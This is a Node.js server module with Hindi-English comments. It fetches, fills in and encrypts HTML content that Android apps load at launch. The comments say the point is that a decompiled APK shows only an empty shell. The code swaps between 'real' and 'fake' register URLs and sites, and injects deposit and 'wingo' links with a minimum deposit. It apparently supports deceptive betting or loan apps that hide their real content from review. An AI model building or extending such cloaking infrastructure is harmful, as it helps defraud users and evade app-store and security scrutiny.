'use strict';

// ─────────────────────────────────────────────────────────────────────────────
// appcontent.js — RUNTIME HTML SERVER (remote content system)
//
// APK me ab popup HTML embed NAHI hota. App launch hote hi server se
// encrypted HTML fetch karta hai:
//   GET /api/app-content/:path          → popup HTML (.bin, fixed key)
//   GET /api/app-content/:path/loading  → loading HTML (.bin, fixed key)
//
// Fayde:
//   - APK me koi Firebase detail ya design HTML nahi hota — decompile karo
//     to sirf khali shell milta hai
//   - Design/links change ho to bina naya APK banaye sab update ho jata hai
//   - HTML server pe bhi encrypted serve hota hai (fixed password), aur
//     transport HTTPS hai
// ─────────────────────────────────────────────────────────────────────────────

const fs = require('fs');
const os = require('os');
const path = require('path');
const db = require('../database/db');
const { encryptHtmlToBin, FIXED_PASSWORD } = require('./encrypt');
const { extractDomain, buildUrls, injectParams } = require('./htmlprocessor');
const { ensureAudioGate, normalizeRegisterDelay, stripIntroSnippet, stripFirebaseLiveScript } = require('./apkbuilder');

const TEMPLATES_DIR = path.join(__dirname, '..', 'templates');
const UPLOADS_DIR = path.join(__dirname, '..', 'uploads');

function normalizePathKey(value) {
  const p = String(value || '').trim();
  if (!/^[a-zA-Z0-9_-]{1,80}$/.test(p)) return null;
  return p;
}

// Order dhundo — real, primary fake, ya EXTRA fake site (order_fake_sites)
// path — teeno me se kisi bhi path pe content serve hota hai.
function findOrderByPath(pathKey) {
  const p = normalizePathKey(pathKey);
  if (!p) return null;
  const row = db.prepare(`
    SELECT o.*, d.popup_html_file, d.fake_popup_html_file, d.java_type, d.category
    FROM orders o JOIN designs d ON d.id = o.design_id
    WHERE lower(o.firebase_path) = lower(?) OR lower(o.fake_firebase_path) = lower(?)
    ORDER BY o.id DESC LIMIT 1
  `).get(p, p);
  if (row) {
    const isFake = row.fake_firebase_path && String(row.fake_firebase_path).toLowerCase() === p.toLowerCase();
    return { row, isFake };
  }
  // Extra fake site ka path?
  const fs = db.prepare(`
    SELECT o.*, d.popup_html_file, d.fake_popup_html_file, d.java_type, d.category,
           f.register_url  AS fs_register_url,
           f.firebase_path AS fs_firebase_path,
           f.deposit_url   AS fs_deposit_url,
           f.wingo_url     AS fs_wingo_url,
           f.domain        AS fs_domain
    FROM order_fake_sites f
    JOIN orders o  ON o.id = f.order_id
    JOIN designs d ON d.id = o.design_id
    WHERE lower(f.firebase_path) = lower(?)
    ORDER BY f.id DESC LIMIT 1
  `).get(p);
  if (!fs) return null;
  return { row: fs, isFake: true, fakeSite: fs };
}

async function encryptToBuffer(html) {
  const tmp = path.join(os.tmpdir(), `zayro_content_${Date.now()}_${Math.random().toString(36).slice(2)}.bin`);
  try {
    await encryptHtmlToBin(html, tmp, FIXED_PASSWORD);
    const buf = fs.readFileSync(tmp);
    fs.unlinkSync(tmp);
    return buf;
  } catch (e) {
    try { fs.unlinkSync(tmp); } catch (_) {}
    return null;
  }
}

function buildParams(orderRow, designRow, isFake, fakeSite) {
  // Extra fake site (order_fake_sites) ho to uske apne links/path use karo
  let registerUrl, firebasePath, depositUrl, wingoUrl, domain;
  if (fakeSite && fakeSite.fs_register_url) {
    registerUrl = fakeSite.fs_register_url;
    firebasePath = fakeSite.fs_firebase_path;
    depositUrl = fakeSite.fs_deposit_url;
    wingoUrl = fakeSite.fs_wingo_url;
    domain = fakeSite.fs_domain;
    if (!depositUrl || !wingoUrl || !domain) {
      const isDhani2 = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
      const urls2 = buildUrls(registerUrl, isDhani2);
      depositUrl = depositUrl || urls2.deposit;
      wingoUrl = wingoUrl || urls2.wingo;
      domain = domain || extractDomain(registerUrl);
    }
  } else {
    registerUrl = isFake ? orderRow.fake_register_url : orderRow.register_url;
    firebasePath = isFake ? orderRow.fake_firebase_path : orderRow.firebase_path;
    const isDhani3 = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
    const urls3 = buildUrls(registerUrl, isDhani3);
    depositUrl = urls3.deposit;
    wingoUrl = urls3.wingo;
    domain = extractDomain(registerUrl);
  }
  if (!registerUrl) return null;
  const isDhani = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
  let appIconBase64 = null;
  if (orderRow.icon_file) {
    const iconPath = path.join(UPLOADS_DIR, orderRow.icon_file);
    if (fs.existsSync(iconPath)) {
      try { appIconBase64 = fs.readFileSync(iconPath).toString('base64'); } catch (_) {}
    }
  }
  return {
    registerUrl,
    depositUrl,
    wingoUrl,
    domain,
    firebasePath,
    minDeposit: orderRow.min_deposit || 300,
    brandTitle: (orderRow.brand_title || '').trim() || orderRow.app_name,
    appIconBase64,
    isDhani
  };
}

// kind: 'popup' | 'loading'
async function buildAppContent(pathKey, kind = 'popup') {
  try {
    const found = findOrderByPath(pathKey);
    if (!found) return null;
    const { row, isFake, fakeSite } = found;
    const design = {
      popup_html_file: row.popup_html_file,
      fake_popup_html_file: row.fake_popup_html_file,
      java_type: row.java_type,
      category: row.category
    };
    const params = buildParams(row, design, isFake, fakeSite);
    if (!params) return null;

    let html;
    if (kind === 'loading') {
      const loadingName = db.prepare('SELECT value FROM settings WHERE key=?').get('loading_html_file')?.value || 'loading.html';
      const lp = path.join(TEMPLATES_DIR, loadingName);
      if (!fs.existsSync(lp)) return null;
      html = stripFirebaseLiveScript(stripIntroSnippet(injectParams(fs.readFileSync(lp, 'utf8'), params)));
    } else {
      const popupName = isFake ? design.fake_popup_html_file : design.popup_html_file;
      const pp = path.join(TEMPLATES_DIR, popupName);
      if (!fs.existsSync(pp)) return null;
      const raw = fs.readFileSync(pp, 'utf8');
      html = normalizeRegisterDelay(ensureAudioGate(injectParams(raw, params), params.domain));
    }

    return await encryptToBuffer(html);
  } catch (e) {
    return null;
  }
}

module.exports = { buildAppContent };
